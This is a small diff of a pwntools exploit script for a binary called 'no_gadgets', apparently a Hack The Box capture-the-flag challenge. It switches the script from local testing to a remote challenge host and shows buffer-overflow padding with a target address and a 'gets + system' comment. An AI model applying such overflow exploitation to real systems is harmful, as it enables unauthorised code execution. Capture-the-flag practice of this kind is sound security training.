@@ -3,7 +3,7 @@
 from pwn import *
 
 context.arch = 'amd64'
-context.log_level = 'debug'
+#context.log_level = 'debug'
 
 #128 + rbp
 offset0 = 127
@@ -17,10 +17,9 @@ padding = offset0*b'A'
 padding += offset1*b'\x00'
 padding += p64(0x404000)
 
-#ip, port='161.35.168.118', 30070
-#ip, port = '83.136.250.41', 46944   #HTB
-#io = remote(ip,port)
-io = process('./no_gadgets')
+ip, port='83.136.254.53', 34118 
+io = remote(ip,port)
+#io = process('./no_gadgets')
 #io = gdb.debug('./no_gadgets','break main')
 
 #gets + system
